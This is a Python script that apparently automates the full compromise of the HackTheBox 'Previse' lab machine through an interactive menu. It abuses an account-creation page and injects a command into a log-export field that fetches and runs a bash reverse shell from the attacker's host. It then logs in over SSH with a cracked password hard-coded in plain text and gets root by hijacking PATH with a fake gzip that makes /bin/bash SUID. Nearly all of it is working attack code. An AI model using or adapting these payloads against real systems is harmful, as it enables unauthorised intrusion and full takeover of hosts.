import sys, os, requests, re, subprocess, paramiko
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Previse
    __________________________________________________________________________\n"""
    print(Fore.RED + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] www-data", "[+] m4lwhere", "[+] root", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.11.104" # change this if change ip on htb.
client = paramiko.SSHClient()
host = target_machine
username = "m4lwhere"
password = "ilovecody112235!"

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"http://10.10.11.104/");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked BoardLight Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")

def user_wwwdata_connect():
    
    post_url=f"http://{target_machine}/accounts.php"
    session = requests.Session()
    
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    payload='username=patito&password=patito&confirm=patito&submit='
    session.post(post_url, headers=header, data=payload)

def get_rce_shell():
    post_url_login = f"http://{target_machine}/login.php"
    get_url_index = f"http://{target_machine}/index.php"
    post_url = f"http://{target_machine}/logs.php"
    session = requests.Session()

    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': f'http://{target_machine}/file_logs.php',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    payload_login = {
        "username": "patito",
        "password": "patito"
    }

    try:
        r1 = session.post(post_url_login, headers=header, data=payload_login)
        cookie_pass=session.cookies.get_dict().get('PHPSESSID')
        #print(cookie_pass)
        r1_get = session.get(get_url_index)
        header['Cookie'] = f"PHPSESSID={cookie_pass}"
        payload = f"delim=comma;curl {machine_ip}:8000|bash"
        session.post(post_url, headers=header, data=payload)
    except Exception as e:
        print(f"[!] Error en la request: {e}")

        

def wwwdata_user_connect():    
    file_rce=f""" echo "#!/bin/bash

bash -c 'bash -i >& /dev/tcp/{machine_ip}/9001 0>&1'" > index.html"""
    commands_send(file_rce);cm.sleep(1)
    print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.YELLOW + f"✔ File index.html [RCE] created.");cm.sleep(.8)
    print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.CYAN + f"1. In other terminal use: python3 -m http.server 8000");cm.sleep(.8)
    print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.CYAN + f"2. In other terminal use: nc -nlvp 9001");cm.sleep(.8)
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [www-data] > " + Fore.WHITE + f"Press ENTER if u ready now...")
    get_rce_shell()

def malwhere_user_connect():
    try:
        cm.sleep(.5)
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)
        print(tmsg,Fore.RED + f"[Exploit Message - Path] > " + Fore.YELLOW + f"Cracked Hashed m4lwhere of mysql on password: mySQL_p@ssw0rd!:)")
        print(tmsg,Fore.RED + f"[Exploit Message] > " + Fore.GREEN + f"Hashcat cracked password > "+Fore.LIGHTBLUE_EX+"ilovecody112235!")
        print(tmsg,Fore.RED + f"[Exploit Message - Connecting...] > " + Fore.LIGHTWHITE_EX + f"✔ Successful connection")
        print(tmsg,Fore.RED + f"[Exploit Message - Connecting...] > " + Fore.LIGHTWHITE_EX + f"✔ G00d H4ch1ng Duhhmhm :3")
        #init shell
        shell = client.invoke_shell()
        while True:
            if shell.recv_ready():
                output = shell.recv(1024).decode('utf-8')
                print(output, end="")
                
            command = input(f"{tmsg} ")
            if command.lower() in ["exit", "quit"]:
                print("\n[!] Closing connection...")
                break
            
            shell.send(command + "\n")
            cm.sleep(0.3)
            while shell.recv_ready():
                output = shell.recv(1024).decode('utf-8')
                print(output, end="")
        shell.close()
        client.close()
    except paramiko.ssh_exception.NoValidConnectionsError:
        print(tmsg,Fore.YELLOW + f"[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")

def root_user_connect():
    try:
        cm.sleep(.5)
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)
        print(tmsg,Fore.RED + f"[Exploit Message - Path] > " + Fore.YELLOW + f"/opt/scripts/access_backup.sh GZIP BIN")
        print(tmsg,Fore.RED + f"[Exploit Message - Connecting...] > " + Fore.LIGHTWHITE_EX + f"✔ Successful connection")
        print(tmsg,Fore.RED + f"[Exploit Message - Connecting...] > " + Fore.LIGHTWHITE_EX + f"✔ G00d H4ch1ng Duhhmhm :3")
        try:
            shell = client.invoke_shell();cm.sleep(.5)
            shell.send("cd /tmp\n" + "\n");cm.sleep(.5)
            shell.send("export PATH=/tmp:$PATH\n" + "\n")
            shell.send("touch gzip\n" + "\n")
            shell.send("chmod +x gzip\n");cm.sleep(.4)
            shell.send('echo "chmod u+s /bin/bash" > gzip\n');cm.sleep(.5)
            shell.send("sudo -u root /opt/scripts/access_backup.sh\n");cm.sleep(.5)
            shell.send(f"{password}\n");cm.sleep(.5)
            shell.send("bash -p\n");cm.sleep(.3)
            while True:
                if shell.recv_ready():
                    output = shell.recv(1024).decode('utf-8')
                    print(output, end="")
                    
                command = input(f"{tmsg} ")
                if command.lower() in ["exit", "quit"]:
                    print("\n[!] Closing connection...")
                    break
                
                shell.send(command + "\n")
                cm.sleep(0.3)
                while shell.recv_ready():
                    output = shell.recv(1024).decode('utf-8')
                    print(output, end="")
            shell.close()
            client.close()
        except Exception as e:
            print(e)
    except paramiko.ssh_exception.NoValidConnectionsError:
        print(tmsg,Fore.YELLOW + f"[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")

   
def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","www-data connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.YELLOW + f"Path Exploit: http://{target_machine}/accounts.php")
                user_wwwdata_connect()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.LIGHTMAGENTA_EX + f"✔ User: patito Password: patito")
                wwwdata_user_connect()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","michael-Previse user connection"))
                malwhere_user_connect()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[m4lwhere-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][2]:
                root_user_connect(); print(ln)
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
